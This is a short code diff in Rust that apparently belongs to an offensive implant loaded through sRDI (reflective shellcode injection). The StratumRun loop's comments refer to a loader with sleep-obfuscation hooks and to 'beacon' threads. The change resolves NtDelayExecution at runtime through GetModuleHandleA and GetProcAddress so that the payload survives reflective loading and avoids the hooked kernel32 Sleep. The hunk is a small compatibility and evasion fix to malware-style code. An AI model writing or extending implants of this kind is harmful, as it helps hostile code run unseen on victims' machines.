@@ -529,12 +529,23 @@ pub unsafe extern "system" fn StratumRun(
 
     let mut tick: u32 = 0;
     loop {
-        // Use NtDelayExecution directly — kernel32!Sleep may be hooked by the loader's
-        // sleep obfuscation trampoline, which corrupts context for non-beacon threads.
+        // Resolve NtDelayExecution dynamically — kernel32!Sleep may be hooked by the
+        // loader's sleep obfuscation trampoline. Static IAT import may fail in sRDI context.
         unsafe {
-            let mut interval: i64 = -600_000_000; // 60s in 100ns units, negative = relative
-            extern "system" { fn NtDelayExecution(alertable: u8, interval: *mut i64) -> i32; }
-            NtDelayExecution(0, &mut interval);
+            type FnNtDelay = unsafe extern "system" fn(u8, *mut i64) -> i32;
+            extern "system" {
+                fn GetModuleHandleA(name: *const u8) -> *mut std::ffi::c_void;
+                fn GetProcAddress(module: *mut std::ffi::c_void, name: *const u8) -> *mut std::ffi::c_void;
+            }
+            let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
+            if !ntdll.is_null() {
+                let p = GetProcAddress(ntdll, b"NtDelayExecution\0".as_ptr());
+                if !p.is_null() {
+                    let delay: FnNtDelay = std::mem::transmute(p);
+                    let mut interval: i64 = -600_000_000; // 60s in 100ns units, negative = relative
+                    delay(0, &mut interval);
+                }
+            }
         }
         tick += 1;
         // Log every minute so we know StratumRun loop is still alive
